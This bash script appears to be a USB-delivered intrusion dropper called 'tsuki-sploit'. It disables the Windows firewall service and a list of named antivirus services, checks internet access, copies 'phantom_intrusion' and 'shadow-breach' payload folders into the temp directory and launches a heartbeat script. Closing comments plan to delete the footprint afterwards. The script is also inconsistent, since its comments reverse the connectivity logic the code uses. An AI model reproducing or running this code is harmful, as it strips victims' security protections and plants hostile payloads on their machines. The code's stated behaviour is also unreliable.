#!/bin/bash

windows_PhaseA () {
  wf_service="mpssvc"
  bash_path="C:\\Windows\\System32\\bash"
  $bash_path -c "sc config $wf_service start=disabled && exit"
  supported_av_services=("WinDefend" "Norton AntiVirus" "McAfeeFramework" "McShield" "Bitdefender Virus Shield" "Avast Antivirus" "Avast Firewall" "AVP" "AVP Firewall" "AVG Antivirus" "AVG Firewall")
  for av in "${supported_av_services[@]}"
  do
    $bash_path -c "sc config $av start=disabled && exit"
  done
  if ping -n 1 -w 1000 8.8.8.8; then
    windows_PhaseB
    windows_PhaseC
  else
    windows_PhaseC
  fi
}

windows_PhaseB () {
  og_path="D:/tsuki-sploit"
  src_dir=("$og_path/phantom_intrusion" "$og_path/shadow-breach")
  dest_dir="%TEMP%\\tsk_sp"
  mkdir "$dest_dir"
  for source in "${src_dir[@]}"
  do
    cp "$source" "$dest_dir"
  done
}

windows_PhaseC () {
  cd /shadow-breach || exit
  ./heartbeat.sh
}

if [[ "$OSTYPE" == "linux-gnu"* ]]; then
  echo "Linux not yet supported. Exiting."
  read -r -p "Press enter to exit..."
  exit
elif [ "$OSTYPE" == "msys" ]; then
  windows_PhaseA
else
  echo "Unknown os detected. Please report back to the developer with: $OSTYPE. Exiting"
  read -r -p "Press enter to exit..."
  exit
fi


# Phase A  Once plugged into usb hub do the following:
    # 1- Disable firewall service
    # 2- Disable AV service
    # 3- Check if host has internet connection
        # 3-1: If no connection found use PHASE B and follow with PHASE C;
        # 3-2: Else use LEVEL C only;

# Phase B:
    # 1- Inject all files into target
    # 2- Remove USB
    # 3- Begin phantom intrusion internally
    # 4- Delete footprint internally

# Phase C:
    # 1- Do not remove USB
    # 2- Begin phantom intrusion locally under USB
    # 3- Remove USB
